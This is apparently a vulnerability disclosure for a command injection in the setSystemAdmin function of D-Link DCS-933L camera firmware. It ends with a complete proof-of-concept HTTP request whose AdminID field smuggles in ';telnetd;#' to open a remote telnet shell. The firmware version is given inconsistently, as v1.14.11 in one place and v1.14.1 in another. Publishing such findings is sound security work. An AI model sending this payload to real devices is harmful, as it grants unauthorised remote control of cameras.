## D-Link DCS933L v1.14.11 Command Execution

**Affected Product**: D-Link DCS933L

**Affected Firmware Versions**: v1.14.11

**Vulnerability Type**: Command Execution

### Overview

A command injection vulnerability exists in the `setSystemAdmin` function of the `alphapd` binary in D-Link DCS-933L firmware v1.14.1. The `AdminID` parameter is obtained directly from user input and inserted into the shell command without proper sanitization, allowing a remote attacker to execute arbitrary operating system commands through a carefully crafted request.

### Vul Details

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-33-01-d54d4e99-47fd-4bb1-aba0-be4328dedb64.png)

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-33-14-d598ade2-b784-48dc-a1cf-2f5378acbbff.png)

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-33-21-9c908d8d-8d1c-4222-b919-5b93750cb660.png)

The function then performs a further check on `AdminID`. However, `checkrangestring` only removes HTML whitespace characters from the input string and limits the input length to a minimum of 1 character and a maximum of 12 characters, without restricting the content.

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-35-07-24e59410-ce28-47b7-a8ed-cf0fee6e0fb7.png)

The `AdminID` value originates directly from attacker-controlled input. Because the input is not properly restricted, it is directly inserted into shell commands, allowing attackers to construct an `AdminID` that triggers arbitrary command execution.

### POC

```http
POST /setSystemAdmin HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 337
Origin: http://192.168.0.1
Authorization: Digest username="admin", realm="_00", nonce="a5adbf40a47f0cb6d4be1a4f7e47296f", uri="/setSystemAdmin", response="b7c1783b92c2052acbbf03eff311cb98", qop=auth, nc=0000006e, cnonce="763eef665da00e02"
Connection: close
Referer: http://192.168.0.1/advanced.htm
Cookie: language=sc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=';telnetd;#&UserID1=&UserID2=&UserID3=&UserID4=&UserID5=&UserID6=&UserID7=&UserID8=&AdminPassword=536b63634c1263cb2363bec763ed0763c7186363c312630423639ac7639a0763c7186363c312630423639ac7639a0763c7186363c312630423639ac7639a0763&SessionKey=1770348129&ConfigSystemAdmin=Apply
```

![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-06-14-40-04-image.png)

The telnetd service is already running and can be connected remotely.
